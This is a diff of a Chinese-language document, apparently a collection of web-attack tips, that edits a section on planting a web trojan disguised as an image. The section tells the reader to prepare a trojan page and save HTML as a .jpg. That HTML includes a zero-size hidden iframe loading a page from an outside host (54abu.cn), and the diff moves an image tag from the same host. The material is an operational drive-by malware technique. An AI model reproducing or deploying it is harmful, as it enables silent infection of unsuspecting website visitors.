@@ -2597,10 +2597,11 @@ KingCMS 是一款网上比较流行的 ASP CMS 程序，程序自带的 FCK 编�
 
 看到这个标题是不是感觉很不可思议呢？没错，就是利用图片的迷惑性来挂马。首先要准备网马一只、图片一张，这两个地址是支持相对路径和绝对路径的。打开记事本将以下内容保存为后缀为 jpg 的文件（例如 xxx.jpg）。
 
+<img src="http://54abu.cn/casper/mm.jpg"></center>
+
 ```html
 <html>
 <iframe src="http://54abu.cn/mm.htm" height=0 width=0></iframe>
-<img src="http://54abu.cn/casper/mm.jpg"></center>
 </html>
 ```
 
